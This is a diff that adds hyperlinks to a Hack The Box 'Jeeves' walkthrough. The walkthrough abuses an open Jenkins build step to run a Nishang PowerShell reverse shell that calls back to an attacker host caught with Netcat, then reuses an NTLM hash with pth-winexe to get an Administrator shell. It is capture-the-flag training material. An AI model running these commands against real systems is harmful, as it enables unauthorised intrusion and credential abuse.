@@ -3,7 +3,7 @@ Jeeves is a medium box from Hack The Box and it is a Windows machine. It present
 
 
 ### Enumeration
-To begin with, we will start a Nmap scan on our target as part of our first enumeration steps. For this, I will opt to use nmapAutomator, although you can run a traditional Nmap scan. 
+To begin with, we will start a Nmap scan on our target as part of our first enumeration steps. For this, I will opt to use <a href="https://github.com/21y4d/nmapAutomator">nmapAutomator</a>, although you can run a traditional Nmap scan. 
 
 ```markdown
 PORT      STATE SERVICE      VERSION
@@ -21,7 +21,7 @@ Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows
 ```
 
 
-We have four open ports on our target machine. After no success with enumerating port 445 (SMB), I decided to open our target machine in a web browser to view what is hosted on port 80 (http://10.10.10.63:80). It appears our target is running ‘Ask Jeeves’ as a service and is running on ‘Microsoft-IIS/10.0’. I will run a DirBuster scan to enumerate further files and directories here but did not obtain anything useful. 
+We have four open ports on our target machine. After no success with enumerating port 445 (SMB), I decided to open our target machine in a web browser to view what is hosted on port 80 (http://10.10.10.63:80). It appears our target is running ‘Ask Jeeves’ as a service and is running on ‘Microsoft-IIS/10.0’. I will run a <a href="https://tools.kali.org/web-applications/dirbuster">DirBuster</a> scan to enumerate further files and directories here but did not obtain anything useful. 
 
 
 ![jeeves](https://user-images.githubusercontent.com/85421181/121051454-17436980-c77f-11eb-8650-e492b0a48f6c.png)
@@ -32,7 +32,7 @@ Continuing with our enumeration, I decided to view what is hosted on port 50000 
 
 ![jetty](https://user-images.githubusercontent.com/85421181/121051549-288c7600-c77f-11eb-8db4-3394bb1d663b.png)
 
-As I run another DirBuster scan on our target machine and port 50000 I decide to research possible exploits available for Jetty 9.4.x and later. After attempting several exploits from GitHub, ExploitDB, and Metasploit I decided that there must be another method to obtain our initial foothold. My DirBuster scan from earlier has finished and has revealed a new directory (/askjeeves). 
+As I run another DirBuster scan on our target machine and port 50000 I decide to research possible exploits available for Jetty 9.4.x and later. After attempting several exploits from GitHub, <a href="https://www.exploit-db.com/exploits/36318">ExploitDB</a>, and <a href="https://www.rapid7.com/db/vulnerabilities/http-jetty-command-execution/">Metasploit</a> I decided that there must be another method to obtain our initial foothold. My DirBuster scan from earlier has finished and has revealed a new directory (/askjeeves). 
 
 ![dirb](https://user-images.githubusercontent.com/85421181/121051588-2e825700-c77f-11eb-9ef5-439a7feee42a.png)
 
@@ -40,7 +40,7 @@ It appears our target is hosting an application called Jenkins, software for dev
 
 ![jenkins](https://user-images.githubusercontent.com/85421181/121051616-33470b00-c77f-11eb-9446-4c541faf6114.png)
 
-After poking around the application it appears that we can build and deploy new projects without any restriction. We will go to ‘New Item > Freestyle project’ and name our project whatever we choose. On the next page, we are given several options and the most interesting is the ‘Build’ sections where we can select ‘Execute Windows batch command’ as an option. Interesting! Let us craft a payload using a Powershell one-liner and Nishang's Invoke-PowerShellTcp.ps1 script. 
+After poking around the application it appears that we can build and deploy new projects without any restriction. We will go to ‘New Item > Freestyle project’ and name our project whatever we choose. On the next page, we are given several options and the most interesting is the ‘Build’ sections where we can select ‘Execute Windows batch command’ as an option. Interesting! Let us craft a payload using a Powershell one-liner and <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1">Nishang's Invoke-PowerShellTcp.ps1</a> script. 
 
 ### Initial Foothold
 We will append the following line to the very end of our Invoke-PowerShellTcp.ps1 script to enable the callback to our attacker machine once executed on our target machine. Please ensure to change ‘10.10.10.10.’ to your IP Address and ‘4444’ to the port which you will be listening on for your reverse shell (Netcat will be utilized for this step and will be explained later). 
@@ -48,14 +48,14 @@ We will append the following line to the very end of our Invoke-PowerShellTcp.ps
 ```markdown
 Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 4444 
 ```
-Great, our script is ready to go! Let's host it on our attacker machine utilizing either SimpleHTTPServer or http.server (either will work). 
+Great, our script is ready to go! Let's host it on our attacker machine utilizing either <a href="https://docs.python.org/2.7/library/simplehttpserver.html?highlight=simplehttpserver#module-SimpleHTTPServer">SimpleHTTPServer</a> or <a href="https://docs.python.org/3/library/http.server.html">http.server</a> (either will work). 
 
 ```markdown
 python -m SimpleHTTPServer 8080
 or
 python3 -m http.server 8080
 ``` 
-Our attacker machine is now hosting 'Invoke-PowerShellTcp.ps1' on our IP address on port 8080. Once downloaded and executed by our target it will send a reverse shell to our attacker machine. We will catch this reverse shell utilizing Netcat. To do this, execute the below command and ensure that the port listed in this command is the same declared at the bottom of our Invoke-PowerShellTcp.ps1 script from earlier.
+Our attacker machine is now hosting 'Invoke-PowerShellTcp.ps1' on our IP address on port 8080. Once downloaded and executed by our target it will send a reverse shell to our attacker machine. We will catch this reverse shell utilizing <a href="https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf">Netcat</a>. To do this, execute the below command and ensure that the port listed in this command is the same declared at the bottom of our Invoke-PowerShellTcp.ps1 script from earlier.
 
 ```markdown
 nc -lvnp 4444
@@ -101,7 +101,7 @@ Viewing all the entries it seems like ‘Backup stuff’ contains an NTLM hash i
 ```markdown
 aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
 ```
-We can use a pass-the-hash attack to gain access to our target's machine as Administrator. We will use pth-winexe for this attack.
+We can use a pass-the-hash attack to gain access to our target's machine as Administrator. We will use <a href="https://www.kali.org/blog/passing-hash-remote-desktop/">pth-winexe</a> for this attack.
 
 ```markdown
 pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //10.10.10.63 cmd.exe
